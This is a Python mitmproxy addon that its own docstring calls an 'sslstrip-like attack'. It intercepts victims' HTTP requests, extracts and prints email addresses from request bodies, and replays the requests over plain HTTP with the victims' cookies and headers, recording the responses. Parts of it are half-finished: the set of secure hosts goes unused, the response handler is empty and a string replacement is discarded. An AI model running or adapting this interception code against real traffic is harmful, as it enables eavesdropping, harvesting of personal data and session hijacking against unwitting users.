"""
This script implements an sslstrip-like attack based on mitmproxy.
https://moxie.org/software/sslstrip/
"""
import json
import re
import urllib.parse
from mitmproxy import http
import requests
import re

# set of SSL/TLS capable hosts
secure_hosts: set[str] = set()
checkers = []
known = []
# ip = json.loads(requests.get('http://ip-api.com/json/').text)['query']

class strip:
    def request(self, flow: http.HTTPFlow) -> None:
        try:
            if flow.request.text != None:
                regex = re.compile(
                    r"(?i)"  # Case-insensitive matching
                    r"(?:[A-Z0-9!#$%&'*+/=?^_`{|}~-]+"  # Unquoted local part
                    r"(?:\.[A-Z0-9!#$%&'*+/=?^_`{|}~-]+)*"  # Dot-separated atoms in local part
                    r"|\"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]"  # Quoted strings
                    r"|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*\")"  # Escaped characters in local part
                    r"@"  # Separator
                    r"[A-Z0-9](?:[A-Z0-9-]*[A-Z0-9])?"  # Domain name
                    r"\.(?:[A-Z0-9](?:[A-Z0-9-]*[A-Z0-9])?)+"  # Top-level domain and subdomains
                )
                match = re.search(regex, flow.request.text)
                if match:
                    print('Found an email')
                    print(match.group(0))
                    if flow.request.host in known:
                        pass
                    else:
                        cookies = flow.request.cookies
                        headers = flow.request.headers
                        data = flow.request.text
                        data.replace(match.group(0), f"iufhiuh{match.group(0)}")
                        r = requests.post('http://'+flow.request.host, headers=headers, cookies=cookies, data=data)
                        print(r.text)
                        known.append([flow.request.host, r.text])
                        flow.request.headers["intercept"] = flow.request.host

        except Exception as E:
            print(f'Killed flow {flow.request.host} for: {E}')
            flow.kill()

    def response(self, flow: http.HTTPFlow) -> None:
        assert flow.response
        pass

addons = [strip()]